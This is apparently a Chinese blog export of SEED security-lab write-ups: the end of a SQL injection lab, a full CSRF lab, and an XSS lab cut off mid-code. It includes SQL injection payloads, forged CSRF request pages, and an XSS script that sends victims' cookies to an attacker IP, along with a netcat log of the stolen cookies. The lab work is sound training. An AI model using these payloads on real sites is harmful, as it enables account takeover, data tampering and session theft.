32193525 |             |         |       |          | 995b8b8c183f349b3cab0ae7fccd39133508d2af |<br>|  5 | Ted   | 50000 | 110000 | 11/3  | 32111111 |             |         |       |          | 99343bff28a7bb51cb6f22cb20a618701a2c2f58 |<br>|  6 | Admin | 99999 | 400000 | 3/5   | 43254314 |             |         |       |          | a5bdf35a1df4ea895905f6f6618e83951a6effc0 |<br>+----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+<br>6 rows in set (0.02 sec)<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$input_uname</span> = <span class="hljs-variable">$_GET</span>[’username’];<br><span class="hljs-variable">$input_pwd</span> = <span class="hljs-variable">$_GET</span>[’Password’];<br><span class="hljs-variable">$hashed_pwd</span> = sha1(<span class="hljs-variable">$input_pwd</span>);<br>...<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT id, name, eid, salary, birth, ssn, address, email,</span><br><span class="hljs-string">nickname, Password</span><br><span class="hljs-string">FROM credential</span><br><span class="hljs-string">WHERE name= ’<span class="hljs-subst">$input_uname</span>’ and Password=’<span class="hljs-subst">$hashed_pwd</span>’&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span> -&gt; query(<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure><p>可以看出$input_uname有注入漏洞</p><h1 id="Task-2-SQL-Injection-Attack-on-SELECT-Statement"><a href="#Task-2-SQL-Injection-Attack-on-SELECT-Statement" class="headerlink" title="Task 2: SQL Injection Attack on SELECT Statement"></a>Task 2: SQL Injection Attack on SELECT Statement</h1><p><a href="http://www.seed-server.com/">www.seed-server.com</a> 是我们要攻击的网站</p><h2 id="Task-2-1-SQL-Injection-Attack-from-webpage"><a href="#Task-2-1-SQL-Injection-Attack-from-webpage" class="headerlink" title="Task 2.1: SQL Injection Attack from webpage."></a>Task 2.1: SQL Injection Attack from webpage.</h2><ul><li>username：admin’#</li><li>passwd：随意</li></ul><p>成功以admin身份进入</p><h2 id="Task-2-2-SQL-Injection-Attack-from-command-line"><a href="#Task-2-2-SQL-Injection-Attack-from-command-line" class="headerlink" title="Task 2.2: SQL Injection Attack from command line."></a>Task 2.2: SQL Injection Attack from command line.</h2><p>在不使用网页的情况下完成上述2.1的注入，比如命令行的curl命令</p><p>curl语句中要对一些字符进行编码，比如撇号、空格、井号，分别对应%27、%20、%23，详见<a href="https://www.w3schools.com/tags/ref_urlencode.ASP">https://www.w3schools.com/tags/ref_urlencode.ASP</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl &#x27;http://www.seed-server.com/unsafe_home.php?username=admin%27%23&#x27;<br></code></pre></td></tr></table></figure><p>成功获取对应的网页源码</p><h2 id="Task-2-3-Append-a-new-SQL-statement"><a href="#Task-2-3-Append-a-new-SQL-statement" class="headerlink" title="Task 2.3: Append a new SQL statement."></a>Task 2.3: Append a new SQL statement.</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-string">&#x27;or Name=&#x27;</span><span class="hljs-keyword">Admin</span><span class="hljs-string">&#x27;;UPDATE credential  SET Salary = &#x27;</span><span class="hljs-number">88888</span><span class="hljs-string">&#x27; WHERE Name=&#x27;</span>Alic<span class="hljs-string">e&#x27;;# 在username中</span><br><span class="hljs-string"></span><br><span class="hljs-string">There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="hljs-keyword">UPDATE</span> credential <span class="hljs-keyword">SET</span> Salary = <span class="hljs-string">&#x27;88888&#x27;</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-type">Name</span>=<span class="hljs-string">&#x27;Alice&#x27;</span>;#<span class="hljs-string">&#x27; and Password=&#x27;</span>da39<span class="hljs-string">&#x27; at line 3]\n</span><br></code></pre></td></tr></table></figure><p>这说明分号前后被分割为两个语句</p><h1 id="Task-3-SQL-Injection-Attack-on-UPDATE-Statement"><a href="#Task-3-SQL-Injection-Attack-on-UPDATE-Statement" class="headerlink" title="Task 3: SQL Injection Attack on UPDATE Statement"></a>Task 3: SQL Injection Attack on UPDATE Statement</h1><p>edit profile的源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$hashed_pwd</span> = sha1(<span class="hljs-variable">$input_pwd</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE credential SET</span><br><span class="hljs-string">        nickname=’<span class="hljs-subst">$input_nickname</span>’,</span><br><span class="hljs-string">        email=’<span class="hljs-subst">$input_email</span>’,</span><br><span class="hljs-string">        address=’<span class="hljs-subst">$input_address</span>’,</span><br><span class="hljs-string">        Password=’<span class="hljs-subst">$hashed_pwd</span>’,</span><br><span class="hljs-string">        PhoneNumber=’<span class="hljs-subst">$input_phonenumber</span>’</span><br><span class="hljs-string">        WHERE ID=<span class="hljs-subst">$id</span>;&quot;</span>;<br><span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure><h2 id="Task-3-1-Modify-your-own-salary"><a href="#Task-3-1-Modify-your-own-salary" class="headerlink" title="Task 3.1: Modify your own salary."></a>Task 3.1: Modify your own salary.</h2><p>注入如下：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-string">&#x27;,Salary=&#x27;</span><span class="hljs-number">99999999&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h2 id="Task-3-2-Modify-other-people’-salary"><a href="#Task-3-2-Modify-other-people’-salary" class="headerlink" title="Task 3.2: Modify other people’ salary."></a>Task 3.2: Modify other people’ salary.</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-string">&#x27;,salary=&#x27;</span><span class="hljs-number">1&#x27;</span> <span class="hljs-keyword">where</span> name=<span class="hljs-string">&#x27;Boby&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h2 id="Task-3-3-Modify-other-people’-password"><a href="#Task-3-3-Modify-other-people’-password" class="headerlink" title="Task 3.3: Modify other people’ password."></a>Task 3.3: Modify other people’ password.</h2><p>先把nmsl转化为sha1，然后填入password字段方可通过nmsl登录成功</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&#x27;,password=&#x27;nmsl&#x27; <span class="hljs-keyword">where</span> <span class="hljs-built_in">name</span>=&#x27;Boby&#x27;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h1 id="Task-4-Countermeasure-—-Prepared-Statement"><a href="#Task-4-Countermeasure-—-Prepared-Statement" class="headerlink" title="Task 4: Countermeasure — Prepared Statement"></a>Task 4: Countermeasure — Prepared Statement</h1><p>预防SQL注入的方法：使用预处理机制，实现代码与数据分离</p><p>可以把原先代码通过预处理进行改写：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$conn</span> = getDB();<br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;prepare(<span class="hljs-string">&quot;SELECT name, local, gender</span><br><span class="hljs-string">FROM USER_TABLE</span><br><span class="hljs-string">WHERE id = ? and password = ? &quot;</span>);<br><span class="hljs-comment">// Bind parameters to the query</span><br><span class="hljs-variable">$stmt</span>-&gt;bind_param(<span class="hljs-string">&quot;is&quot;</span>, <span class="hljs-variable">$id</span>, <span class="hljs-variable">$pwd</span>);<br><span class="hljs-variable">$stmt</span>-&gt;execute();<br><span class="hljs-variable">$stmt</span>-&gt;bind_result(<span class="hljs-variable">$bind_name</span>, <span class="hljs-variable">$bind_local</span>, <span class="hljs-variable">$bind_gender</span>);<br><span class="hljs-variable">$stmt</span>-&gt;fetch();<br></code></pre></td></tr></table></figure><p>在这里，我们将向数据库发送SQL语句的过程分为两个步骤</p><ul><li>仅发送代码部分，即不包含实际数据的SQL语句。这是准备步骤。从上面的代码片段可以看出，实际数据被问号？代替。</li><li>使用bind param()将数据发送到数据库。数据库将在此步骤中发送的所有内容 <strong>仅视为数据，不再视为代码。</strong> 它将数据绑定到准备好的语句的相应问号。</li></ul><p>通过这种方式，我们将代码与数据做到了分离，从而防止了SQL注入的可能性</p>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-lab：Cross-Site Request Forgery Attack Lab</title>
    <link href="/p/cb388511/"/>
    <url>/p/cb388511/</url>
    
    <content type="html"><![CDATA[<h1 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title="CSRF原理"></a>CSRF原理</h1><p>跨站脚本攻击</p><p>原理</p><ul><li>同站请求<ul><li>一个来自example.com的网页向example.com发送请求</li></ul></li><li>跨站请求<ul><li>evil.com向example.com发送请求</li></ul></li></ul><p><strong>假设受害者访问了evil.com，该网页中嵌入了js代码，进行了跨站请求，浏览器在请求发起时附加所有属于example.com的cookies，那么就会造成跨站脚本攻击</strong></p><p>一个get请求示例</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>This page forges an HTTP GET request.<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.csrflabelgg.com/action/friends/add?friend=59&quot;</span> </span><br><span class="hljs-tag">            <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;image&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;1&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>src</code>属性指定一个URL <code>http://www.csrflabelgg.com/action/friends/add?friend=59</code>，它似乎是带有<code>friend</code>参数的HTTP GET请求的URL。如果用户访问了这个页面并且已经登陆到csrflabelgg.com网站，则该 GET 请求会向该网站发送<code>friend=59</code>参数的请求</p><p>防御：可以在header中增加csrf_token</p><h1 id="lab-setup"><a href="#lab-setup" class="headerlink" title="lab setup"></a>lab setup</h1><p>下载lab文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -q https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip -o Labsetup.zip<br></code></pre></td></tr></table></figure><p>解压</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">unzip Labsetup.zip<br></code></pre></td></tr></table></figure><p>运行容器</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">dcbuild</span> <span class="hljs-comment">#docker-compose构建镜像</span><br>dcup <span class="hljs-comment">#运行容器</span><br></code></pre></td></tr></table></figure><p>修改hosts文件增加dns映射</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.9.0.5</span> www.seed-server.com<br><span class="hljs-number">10.9.0.5</span> www.example32.com<br><span class="hljs-number">10.9.0.105</span> www.attacker32.com<br></code></pre></td></tr></table></figure><h1 id="Task-1-Observing-HTTP-Request"><a href="#Task-1-Observing-HTTP-Request" class="headerlink" title="Task 1: Observing HTTP Request"></a>Task 1: Observing HTTP Request</h1><p>由于我们需要伪造 HTTP 请求，因此需要观察合法的http请求是什么样子，因此可以使用HTTP Header Live给Get/Post请求抓包</p><h1 id="Task-2-CSRF-Attack-using-GET-Request"><a href="#Task-2-CSRF-Attack-using-GET-Request" class="headerlink" title="Task 2: CSRF Attack using GET Request"></a>Task 2: CSRF Attack using GET Request</h1><blockquote><p><code>__elgg_ts</code>和<code>__elgg_token</code>是保护机制，为了简化实验难度，需要被禁用</p></blockquote><p>更改网页源码即可，代码位于容器中<code>/var/www/addfriend.html</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;html&gt;<br>    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml">        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>This page forges an HTTP GET request.<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml">        <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.csrflabelgg.com/action/friends/add?friend=59&quot;</span> //修改</span></span><br><span class="hljs-tag"><span class="xml">            <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;image&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;1&quot;</span> /&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>以Alice的身份登录Elgg，然后点击<a href="http://www.attacker32.com/addfriend.html/">http://www.attacker32.com/addfriend.html/</a> ，发现好友已经被添加</p><h1 id="Task-3-CSRF-Attack-using-POST-Request"><a href="#Task-3-CSRF-Attack-using-POST-Request" class="headerlink" title="Task 3: CSRF Attack using POST Request"></a>Task 3: CSRF Attack using POST Request</h1><p>点击edit profile，然后抓包看这个行为导致了什么样的post请求</p><ul><li>acesslevel的值2将字段的访问级别设置为 public，否则其他人无法看到此字段</li><li>guid是用户的身份id，Alice是56</li></ul><p>更改容器中<code>/var/www/editprofile.html</code>的代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;html&gt;<br>    &lt;body&gt;<br>        &lt;h1&gt;This page forges an HTTP POST request&lt;/h1&gt;<br>        &lt;script type=&quot;text/javascript&quot;&gt;<br>            function forge_post()&#123;<br>                var fields;<br><br>                fields = &quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;name&#x27; value=&#x27;Alice&#x27;&gt;&quot;;<br>                fields += &quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;description&#x27; value=&#x27;SAMY is MY HERO&#x27;&gt;&quot;;<br>                fields += &quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;accesslevel[description] value=&#x27;2&#x27;&gt;&quot;;<br>                fields += &quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;guid&#x27; value=&#x27;56&#x27;&gt;&quot;;<br> <br>                var p = document.createElement(&quot;form&quot;);<br>                p.action = &quot;http://www.seed-server.com/action/profile/edit&quot;;<br>                p.innerHTML = fields;<br>                p.method = &quot;post&quot;;<br>                document.body.appendChild(p);<br>                p.submit();<br>            &#125;<br><br>            window.onload = function() &#123;<br>                forge_post();<br>            &#125;<br>        &lt;/script&gt;<br>    &lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>Question 1: The forged HTTP request needs Alice’s user id (guid) to work properly. If Boby targets<br>Alice specifically, before the attack, he can find ways to get Alice’s user id. Boby does not know<br>Alice’s Elgg password, so he cannot log into Alice’s account to get the information. Please describe<br>how Boby can solve this problem.</p><ul><li>f12</li></ul><p>Question 2: If Boby would like to launch the attack to anybody who visits his malicious web page.<br>In this case, he does not know who is visiting the web page beforehand. Can he still launch the CSRF</p><ul><li>不能</li></ul><h1 id="Task-4-Enabling-Elgg’s-Countermeasure"><a href="#Task-4-Enabling-Elgg’s-Countermeasure" class="headerlink" title="Task 4: Enabling Elgg’s Countermeasure"></a>Task 4: Enabling Elgg’s Countermeasure</h1><p>elgg防止csrf攻击的安全措施：</p><ul><li>在页面中放置一个秘密令牌（token），通过检查令牌是否出现在请求中，它们可以判断请求是同一站点请求还是跨站点请求</li><li>elgg在HTTP请求中加入了<code>__elgg_t</code>和<code>__elgg_token</code>参数，分别是timestamp（时间戳）和【站点秘密值(从数据库检索)、时间戳、用户会话 ID 和随机生成的会话字符串的哈希值】，服务器会验证这两个是否正确</li><li>valid函数验证token和时间戳，seed在这个函数的开头添加了一个返回值从而禁用了验证</li><li>如果要启用验证只需删除return语句<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> function <span class="hljs-title">validate</span><span class="hljs-params">(Request $request)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span>; <span class="hljs-comment">// Added for SEED Labs (disabling the CSRF countermeasure)</span><br>    $token = $request-&gt;getParam(’__elgg_token’);<br>    $ts = $request-&gt;getParam(’__elgg_ts’);<br>    ... (code omitted) ...<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="Task-5-Experimenting-with-the-SameSite-Cookie-Method"><a href="#Task-5-Experimenting-with-the-SameSite-Cookie-Method" class="headerlink" title="Task 5: Experimenting with the SameSite Cookie Method"></a>Task 5: Experimenting with the SameSite Cookie Method</h1><p>Cookie 的SameSite属性有三个选择:</p><ul><li>Strict</li><li>Lax</li><li>None</li></ul><p>值为Strict，则不会跨站请求使用</p><p>导航到目标网址的 GET 请求，只包括三种情况：链接，预加载请求，GET 表单。详见下表。</p><table><thead><tr><th>请求类型</th><th>示例</th><th>正常情况</th><th>Lax</th></tr></thead><tbody><tr><td>链接</td><td><code>&lt;a href=&quot;...&quot;&gt;&lt;/a&gt;</code></td><td>发送 Cookie</td><td>发送 Cookie</td></tr><tr><td>预加载</td><td><code>&lt;link rel=&quot;prerender&quot; href=&quot;...&quot;/&gt;</code></td><td>发送 Cookie</td><td>发送 Cookie</td></tr><tr><td>GET 表单</td><td><code>&lt;form method=&quot;GET&quot; action=&quot;...&quot;&gt;</code></td><td>发送 Cookie</td><td>发送 Cookie</td></tr><tr><td>POST 表单</td><td><code>&lt;form method=&quot;POST&quot; action=&quot;...&quot;&gt;</code></td><td>发送 Cookie</td><td>不发送</td></tr><tr><td>iframe</td><td><code>&lt;iframe src=&quot;...&quot;&gt;&lt;/iframe&gt;</code></td><td>发送 Cookie</td><td>不发送</td></tr><tr><td>AJAX</td><td><code>$.get(&quot;...&quot;)</code></td><td>发送 Cookie</td><td>不发送</td></tr><tr><td>Image</td><td><code>&lt;img src=&quot;...&quot;&gt;</code></td><td>发送 Cookie</td><td>不发送</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-lab：Cross-site Scripting Attack Lab</title>
    <link href="/p/53d24de/"/>
    <url>/p/53d24de/</url>
    
    <content type="html"><![CDATA[<p>无内鬼，整点前端</p><h1 id="lab-setup"><a href="#lab-setup" class="headerlink" title="lab setup"></a>lab setup</h1><p>参考seed系列其他博客</p><h1 id="Task-1-Posting-a-Malicious-Message-to-Display-an-Alert-Window"><a href="#Task-1-Posting-a-Malicious-Message-to-Display-an-Alert-Window" class="headerlink" title="Task 1: Posting a Malicious Message to Display an Alert Window"></a>Task 1: Posting a Malicious Message to Display an Alert Window</h1><p>通过在个人主页汇总嵌入JavaScript 程序，这样当其他用户查看个人主页时，将执行 JavaScript 程序并显示一个警告窗口</p><ul><li>在brief description框中填入<code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code></li></ul><p>如果想运行一个很长的 JavaScript，但是受到表单中可键入字符数量的限制，可以将 JavaScript 程序存储在一个独立js文件中，然后使用 &lt; script &gt; 标记中的 src 属性引用它</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span><br>    src=<span class="hljs-string">&quot;http://www.example.com/myscripts.js&quot;</span>&gt;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><h1 id="Task-2-Posting-a-Malicious-Message-to-Display-Cookies"><a href="#Task-2-Posting-a-Malicious-Message-to-Display-Cookies" class="headerlink" title="Task 2: Posting a Malicious Message to Display Cookies"></a>Task 2: Posting a Malicious Message to Display Cookies</h1><p>当其他用户查看个人主页时，用户的 cookie 将显示在警告窗口中:<code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code></p><h1 id="Task-3-Stealing-Cookies-from-the-Victim’s-Machine"><a href="#Task-3-Stealing-Cookies-from-the-Victim’s-Machine" class="headerlink" title="Task 3: Stealing Cookies from the Victim’s Machine"></a>Task 3: Stealing Cookies from the Victim’s Machine</h1><p>攻击者希望通过 JavaScript 代码将 cookie 发送给自己，可以如下构造js代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;script&gt;document.write(<span class="hljs-string">&#x27;&lt;img src=http://10.9.0.1:5555?c=&#x27;</span> + escape(document.cookie) + <span class="hljs-string">&#x27;&gt;&#x27;</span>); &lt;/script&gt;<br></code></pre></td></tr></table></figure><p>当 JavaScript 插入 img 标记时，浏览器尝试从 src 字段中的 URL 加载图像; 这导致向攻击者的机器发送 HTTP GET 请求，上面的 JavaScript 将 cookie 发送到攻击者ip的端口5555(IP 地址为10.9.0.1) ，在那里攻击者有一个 TCP 服务器监听相同的端口</p><p>攻击者机器运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lknv 5555<br></code></pre></td></tr></table></figure><ul><li>-l Listen on a specified port and print any data received</li><li>-v Produce more verbose output.</li><li>-n 直接使用IP地址，而不通过域名服务器</li><li>-k 当一个连接完成时，监听另一个连接</li></ul><p>攻击者shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lknv 5555</span><br>Listening on 0.0.0.0 5555<br>Connection received on 10.0.2.15 58018<br>GET /?c=Elgg%3D8fueaeqm5p111ufasemhhpep6n%3B%20elggperm%3Dzv6b-6-jXGHCHP6e8DaQqjlkyRIW883S HTTP/1.1<br>Host: 10.9.0.1:5555<br>User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0<br>Accept: image/webp,*/*<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Connection: keep-alive<br>Referer: http://www.seed-server.com/profile/alice<br></code></pre></td></tr></table></figure><h1 id="Task-4-Becoming-the-Victim’s-Friend"><a href="#Task-4-Becoming-the-Victim’s-Friend" class="headerlink" title="Task 4: Becoming the Victim’s Friend"></a>Task 4: Becoming the Victim’s Friend</h1><p>编写一个 XSS 蠕虫，将 Samy 作为访问 Samy 页面的任何其他用户的朋友,这个蠕虫不会自我传播</p><p>先用http live header抓一下加/删好友的包：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span>http://www.seed-server.com/action/friends/add?friend=<span class="hljs-number">56</span>&amp;__elgg_ts=<span class="hljs-number">1665136694</span>,<span class="hljs-number">1665136694</span>&amp;__elgg_token=fd<span class="hljs-number">9</span>a<span class="hljs-number">9</span>_Ls<span class="hljs-number">7</span>UPwUtwEuzLjCg,fd<span class="hljs-number">9</span>a<span class="hljs-number">9</span>_Ls<span class="hljs-number">7</span>UPwUtwEuzLjCg<br><br><span class="hljs-attribute">GET</span>http://www.seed-server.com/action/friends/remove?friend=<span class="hljs-number">56</span>&amp;__elgg_ts=<span class="hljs-number">1665136694</span>,<span class="hljs-number">1665136694</span>&amp;__elgg_token=fd<span class="hljs-number">9</span>a<span class="hljs-number">9</span>_Ls<span class="hljs-number">7</span>UPwUtwEuzLjCg,fd<span class="hljs-number">9</span>a<span class="hljs-number">9</span>_Ls<span class="hljs-number">7</span>UPwUtwEuzLjCg<br></code></pre></td></tr></table></figure><p>根据上面请求依葫芦画瓢组织一下sendurl(注意一下url里面的friend和friends)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>    window.onload = function () &#123;<br>        <span class="hljs-keyword">var</span> Ajax=<span class="hljs-keyword">null</span>;<br>        <br>        <span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.security.token.__elgg_ts;<br>        <span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.security.token.__elgg_token;<br>        <br>        <span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.seed-server.com/action/friends/add?friend=56&quot;</span> + ts + token;<br>        <br>        Ajax=<span class="hljs-keyword">new</span> XMLHttpRequest();<br>        Ajax.open(<span class="hljs-string">&quot;GET&quot;</span>, sendurl, <span class="hljs-keyword">true</span>);<br>        Ajax.send();<br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>Question 1: Explain the purpose of Lines ¿and ¡, why are they are needed?（ts、token）</p><p>是用作针对CSRF的安全措施的值，每次加载页面时它们都会更改，这里动态获取使用token实现认证</p><p>Question 2: If the Elgg application only provide the Editor mode for the “About Me” field, i.e.,you cannot switch to the Text mode, can you still launch a successful attack?</p><p>不能。编辑器模式添加了额外的 HTML 并更改了一些符号，比如<code>&lt;p&gt;</code></p><h1 id="Task-5-Modifying-the-Victim’s-Profile"><a href="#Task-5-Modifying-the-Victim’s-Profile" class="headerlink" title="Task 5: Modifying the Victim’s Profile"></a>Task 5: Modifying the Victim’s Profile</h1><p>要求修改受害者的“about me”字段</p><p>抓包，先看一下修改“about me”字段对应的post请求content字段中的内容：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 